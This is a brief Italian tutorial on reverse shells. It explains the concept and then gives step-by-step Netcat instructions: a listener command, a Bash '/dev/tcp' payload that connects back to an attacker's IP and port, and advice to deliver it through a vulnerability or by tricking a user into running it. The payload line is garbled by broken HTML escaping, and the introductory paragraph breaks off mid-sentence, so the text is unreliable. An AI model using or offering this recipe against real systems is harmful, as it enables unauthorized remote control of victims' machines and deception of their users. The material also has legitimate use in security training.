# Reverse shell
In una reverse shell, l’attaccante crea un’istanza di un server che ascolta su una porta specifica. Il sistema di destinazione, che è stato precedentemente compromesso dall’attaccante, si connette al server dell’attaccante. In questo modo, l’attaccante può ottenere l’accesso remoto al sistema di destinazione e controllarlo a distanza.

In pratica, l’attaccante utilizza una reverse shell per aggirare le restrizioni di sicurezza imposte dal firewall del sistema di destinazione. Invece di connettersi direttamente al sistema di destinazione, l’attaccante fa in modo che il sistema di destinazione si connetta al suo server, che

# guida su come creare una reverse shell utilizzando Netcat

# 1
Apri il terminale e digita il seguente comando per creare un’istanza di Netcat in ascolto su una porta specifica:

nc -lvp <port>

Sostituisci <port> con il numero della porta che vuoi utilizzare.

# 2 
Apri un altro terminale e digita il seguente comando per creare un payload di shell utilizzando Bash:

bash -i &\gt;& /dev/tcp/&lt;attacker IP&gt;&lt;attacker port&gt; 0&gt;&1

Sostituisci ;attacker IP> con l’indirizzo IP dell’attaccante e ;attacker port> con il numero della porta che hai scelto in precedenza.

# 3
Carica il payload di shell sul sistema di destinazione attraverso una vulnerabilità o ingannando l’utente a eseguirlo.

# 4
Una volta eseguito il payload, viene stabilita una connessione con il sistema dell’attaccante, creando una sessione di shell che può essere utilizzata per eseguire comandi sul sistema di destinazione.

per maggiori dettagli ---> [Reverse shell tutorial](https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e)